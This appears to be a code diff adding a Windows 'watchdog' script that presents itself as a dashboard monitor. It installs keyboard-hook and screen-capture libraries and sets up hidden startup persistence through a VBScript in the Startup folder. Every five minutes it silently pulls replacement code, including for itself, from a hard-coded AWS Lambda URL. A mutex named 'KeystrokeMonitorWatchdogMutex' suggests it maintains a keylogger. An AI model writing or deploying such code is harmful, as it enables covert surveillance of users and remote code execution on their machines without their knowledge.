@@ -1,0 +1,290 @@
+import os
+import sys
+import time
+import urllib.request
+import subprocess
+
+# Dynamic Path Resolution
+IS_FROZEN = getattr(sys, 'frozen', False)
+
+if IS_FROZEN:
+    import shutil
+    # When frozen, sys.executable is watchdog.exe. We must locate python/pythonw on the system.
+    PYTHON_EXE = shutil.which("python") or "python"
+    PYTHONW_EXE = shutil.which("pythonw") or "pythonw"
+    
+    # Check common user install paths if not in PATH
+    if not os.path.exists(PYTHONW_EXE) and not shutil.which("pythonw"):
+        local_appdata = os.environ.get("LOCALAPPDATA", "")
+        if local_appdata:
+            python_dir = os.path.join(local_appdata, "Programs", "Python")
+            if os.path.exists(python_dir):
+                for root, dirs, files in os.walk(python_dir):
+                    if "pythonw.exe" in files:
+                        PYTHONW_EXE = os.path.join(root, "pythonw.exe")
+                        PYTHON_EXE = os.path.join(root, "python.exe")
+                        break
+else:
+    PYTHON_EXE = sys.executable
+    PYTHONW_EXE = sys.executable.lower().replace("python.exe", "pythonw.exe")
+
+if IS_FROZEN:
+    CURRENT_DIR = os.path.dirname(sys.executable)
+else:
+    CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
+SCRIPT_PATH = os.path.join(CURRENT_DIR, "app.py")
+LOG_PATH = os.path.join(CURRENT_DIR, "watchdog_log.txt")
+STARTUP_FOLDER = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
+VBS_LAUNCHER_PATH = os.path.join(STARTUP_FOLDER, "start_watchdog.vbs")
+
+# Windows-specific flags to prevent console window popups
+SUBPROCESS_FLAGS = {}
+if os.name == 'nt':
+    SUBPROCESS_FLAGS['creationflags'] = 0x08000000
+
+
+def log_event(message):
+    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+    log_line = f"[{timestamp}] {message}\n"
+    try:
+        if sys.stdout is not None:
+            print(log_line.strip())
+    except Exception:
+        pass
+    try:
+        # Rotate log if it exceeds 1MB
+        if os.path.exists(LOG_PATH) and os.path.getsize(LOG_PATH) > 1024 * 1024:
+            os.replace(LOG_PATH, LOG_PATH + ".bak")
+        with open(LOG_PATH, "a") as f:
+            f.write(log_line)
+    except Exception:
+        pass
+
+def get_render_url():
+    env_path = os.path.join(CURRENT_DIR, ".env")
+    if os.path.exists(env_path):
+        try:
+            with open(env_path, "r", encoding="utf-8") as f:
+                for line in f:
+                    if line.strip().startswith("RENDER_SERVER_URL="):
+                        return line.strip().split("RENDER_SERVER_URL=")[1].strip()
+        except Exception:
+            pass
+    return "https://lnslbk3kmal2h2cdlfrvzpwgmu0qzetl.lambda-url.ap-south-1.on.aws"
+
+def get_device_token():
+    env_path = os.path.join(CURRENT_DIR, ".env")
+    if os.path.exists(env_path):
+        try:
+            with open(env_path, "r", encoding="utf-8") as f:
+                for line in f:
+                    if line.strip().startswith("DEVICE_TOKEN="):
+                        return line.strip().split("DEVICE_TOKEN=")[1].strip()
+        except Exception:
+            pass
+    return ""
+
+def check_for_updates():
+    url = get_render_url()
+    if not url:
+        return False
+        
+    log_event("Checking for updates from Render server...")
+    app_updated = False
+    token = get_device_token()
+    headers = {"User-Agent": "MSTool-Watchdog/1.0"}
+    if token:
+        headers["X-Device-Token"] = token
+    
+    # 1. Update app.py
+    try:
+        req_url = f"{url.rstrip('/')}/api/client/update/app.py"
+        req = urllib.request.Request(req_url, headers=headers)
+        with urllib.request.urlopen(req, timeout=10) as response:
+            if response.status == 200:
+                remote_code = response.read().decode('utf-8')
+                local_path = os.path.join(CURRENT_DIR, "app.py")
+                
+                local_code = ""
+                if os.path.exists(local_path):
+                    with open(local_path, "r", encoding="utf-8") as lf:
+                        local_code = lf.read()
+                        
+                if remote_code.strip() and remote_code != local_code:
+                    log_event("Found new version of app.py! Updating...")
+                    kill_stale_processes()
+                    time.sleep(1)
+                    with open(local_path, "w", encoding="utf-8") as lf:
+                        lf.write(remote_code)
+                    log_event("app.py updated successfully.")
+                    app_updated = True
+    except Exception as e:
+        log_event(f"Error checking app.py updates: {e}")
+        
+    # 2. Update watchdog.py
+    try:
+        req_url = f"{url.rstrip('/')}/api/client/update/watchdog.py"
+        req = urllib.request.Request(req_url, headers=headers)
+        with urllib.request.urlopen(req, timeout=10) as response:
+            if response.status == 200:
+                remote_code = response.read().decode('utf-8')
+                local_path = os.path.abspath(__file__)
+                
+                local_code = ""
+                if os.path.exists(local_path):
+                    with open(local_path, "r", encoding="utf-8") as lf:
+                        local_code = lf.read()
+                        
+                if remote_code.strip() and remote_code != local_code:
+                    log_event("Found new version of watchdog.py! Updating...")
+                    with open(local_path, "w", encoding="utf-8") as lf:
+                        lf.write(remote_code)
+                    log_event("watchdog.py updated successfully.")
+    except Exception as e:
+        log_event(f"Error checking watchdog.py updates: {e}")
+        
+    return app_updated
+
+def is_healthy():
+    try:
+        # Check if the Flask server port 58291 is open and responding
+        with urllib.request.urlopen("http://127.0.0.1:58291/", timeout=5) as response:
+            return response.status == 200
+    except Exception:
+        return False
+
+def kill_stale_processes():
+    try:
+        log_event("Terminating stale processes...")
+        # Precise command to kill any python processes running app.py (excluding the watchdog itself)
+        ps_cmd = (
+            f"Get-CimInstance Win32_Process -Filter \"Name='python.exe' or Name='pythonw.exe'\" | "
+            f"Where-Object {{$_.CommandLine -like '*app.py*'}} | "
+            f"ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force }}"
+        )
+        subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, **SUBPROCESS_FLAGS)
+        
+        # Free up port 58291 if bound by any other zombie process
+        port_cmd = (
+            "Get-NetTCPConnection -LocalPort 58291 -ErrorAction SilentlyContinue | "
+            "ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }"
+        )
+        subprocess.run(["powershell", "-Command", port_cmd], capture_output=True, **SUBPROCESS_FLAGS)
+    except Exception as e:
+        log_event(f"Error while killing stale processes: {e}")
+
+def start_app():
+    log_event("Starting app.py...")
+    try:
+        # Run app.py in background silently using pythonw.exe
+        subprocess.Popen([PYTHONW_EXE, SCRIPT_PATH], cwd=os.path.dirname(SCRIPT_PATH), **SUBPROCESS_FLAGS)
+        log_event("app.py successfully launched.")
+    except Exception as e:
+        log_event(f"Failed to start app.py: {e}")
+
+def install():
+    print("==================================================")
+    print("Installing Silent Startup & Watchdog Service...")
+    print("==================================================")
+    
+    # 1. Install pip dependencies
+    print("\n[1/3] Ensuring dependencies (flask, pynput, pillow) are installed...")
+    try:
+        subprocess.run([PYTHON_EXE, "-m", "pip", "install", "flask", "pynput", "pillow", "boto3", "python-dotenv", "mss"], check=True)
+        print("Dependencies verified successfully.")
+    except Exception as e:
+        print(f"Warning: Dependency installation returned: {e}")
+
+    # 2. Create the VBScript launcher in the user's Startup directory
+    print("\n[2/3] Registering silent startup VBScript in Startup folder...")
+    vbs_content = (
+        f'Set WshShell = CreateObject("WScript.Shell")\n'
+        f'WshShell.Run """{PYTHONW_EXE}"" ""{os.path.abspath(__file__)}""", 0, False\n'
+    )
+    try:
+        os.makedirs(STARTUP_FOLDER, exist_ok=True)
+        with open(VBS_LAUNCHER_PATH, "w") as f:
+            f.write(vbs_content)
+        print(f"Created silent launcher: {VBS_LAUNCHER_PATH}")
+    except Exception as e:
+        print(f"Error creating startup VBScript: {e}")
+        sys.exit(1)
+
+    # 3. Spawn the watchdog in the background using pythonw.exe
+    print("\n[3/3] Launching background watchdog...")
+    try:
+        subprocess.Popen([PYTHONW_EXE, os.path.abspath(__file__)], cwd=os.path.dirname(os.path.abspath(__file__)), **SUBPROCESS_FLAGS)
+        print("Watchdog launched in the background successfully.")
+        print("Setup complete! The dashboard is now monitored and will start automatically on reboot.")
+    except Exception as e:
+        print(f"Error launching watchdog process: {e}")
+        sys.exit(1)
+    print("==================================================")
+
+# Keep mutex reference alive for the lifetime of the process
+sys_mutex = None
+
+def check_single_instance():
+    global sys_mutex
+    if os.name == 'nt':
+        try:
+            import ctypes
+            # Local namespace is appropriate for user sessions
+            mutex_name = "Local\\KeystrokeMonitorWatchdogMutex"
+            sys_mutex = ctypes.windll.kernel32.CreateMutexW(None, True, mutex_name)
+            last_error = ctypes.windll.kernel32.GetLastError()
+            # 183 = ERROR_ALREADY_EXISTS, 5 = ERROR_ACCESS_DENIED
+            if last_error == 183 or last_error == 5 or not sys_mutex:
+                print("Another watchdog instance is already running. Exiting.")
+                sys.exit(0)
+        except Exception as e:
+            log_event(f"Single instance check failed: {e}")
+
+def monitor_loop():
+    log_event("Watchdog monitoring loop active.")
+    
+    # 1. Startup Delay
+    log_event("Startup delay of 30 seconds active to let the system settle. Waiting...")
+    time.sleep(30)
+    
+    # 2. Check for updates on startup
+    check_for_updates()
+    
+    consecutive_failures = 0
+    last_update_check_time = time.time()
+    
+    while True:
+        try:
+            # Periodically check for updates (every 5 minutes / 300 seconds)
+            now_time = time.time()
+            if now_time - last_update_check_time >= 300:
+                last_update_check_time = now_time
+                if check_for_updates():
+                    start_app()
+                
+            if is_healthy():
+                consecutive_failures = 0
+            else:
+                consecutive_failures += 1
+                log_event(f"Application is unresponsive or down (Consecutive failures: {consecutive_failures}). Re-initializing...")
+                
+                # 3. Backoff Cooldown after 3 failures
+                if consecutive_failures >= 3:
+                    log_event("Multiple consecutive failures detected. Entering 5-minute cooldown to prevent system resource exhaustion...")
+                    time.sleep(300)
+                    consecutive_failures = 0  # Reset counter after cooldown
+                    continue
+                
+                kill_stale_processes()
+                time.sleep(2)
+                start_app()
+        except Exception as e:
+            log_event(f"Error in monitor loop: {e}")
+        time.sleep(60)
+
+if __name__ == "__main__":
+    if len(sys.argv) > 1 and sys.argv[1] == "--install":
+        install()
+    else:
+        check_single_instance()
+        monitor_loop()
